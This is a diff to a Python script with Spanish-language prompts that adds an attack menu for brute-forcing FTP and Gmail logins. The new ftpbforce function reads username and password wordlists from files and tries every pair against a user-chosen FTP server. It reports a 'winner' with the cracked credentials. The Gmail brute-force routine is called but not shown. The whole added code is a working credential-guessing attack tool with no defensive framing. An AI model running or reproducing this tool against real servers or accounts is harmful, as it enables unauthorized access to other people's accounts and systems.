@@ -5,9 +5,62 @@ import subprocess
 import getpass
 import os
 import ftplib
+import time
 
+def bforcemenu():
+	choice = str()
+	while choice != "r":
+		subprocess.call(["cmd.exe","/c","cls"])
+		choice = input('''
+		¿Qué desea atacar? 
+		******************
+		[f]tp
+		[g]mail
+		******************
+		    [r]egresar
 
-
+			>''')
+		choice = choice.lower()
+		if choice == "f":
+			ftpbforce()
+		elif choice == "g":
+			bforce()
+def fl(f):
+	while True:
+			subprocess.call(["cmd.exe","/c","cls"])
+			ufile = input("introduzca la ruta de archivo de posibles {}: ".format(f))
+			try:
+			    ufile = open(ufile, "r")				
+			except:
+				getpass.getpass("no se pudo encontrar el archivo, vuelva a intentar...")
+			else:
+				return ufile
+def ftpbforce():
+	subprocess.call(["cmd.exe","/c","cls"])
+	server = str(input("introduzca la ip del servidor ftp:"))
+	users = fl("usuarios")
+	passwords = fl("contraseñas")
+	conexion = ftplib.FTP(server)
+	passw = False
+	for user in users:
+		if passw == True:
+			break
+		for password in passwords:
+			try:
+				conexion.login(user, password)
+			except Exception as e:
+				print("\n[*]{}".format(e))
+				time.sleep(3)
+			else:
+				print('''
+				tenemos un ganador.
+				Servidor: {}
+				Usuario: {}
+				Contraseña: {}
+				'''.format(server, user, password))
+				passw = True
+				break
+	getpass.getpass("Presiona enter para continuar...")
 def config():
 	conf = str()
 	while conf != 'r':
@@ -79,13 +132,10 @@ def run():
              > '''))
 		do == do.lower()
 		if do == "f":
-			bforce()
+			bforcemenu()
 		elif do == "c":
 			config()
 
 
 if __name__ == '__main__':
-	run()
-
-
-	
+	run()	
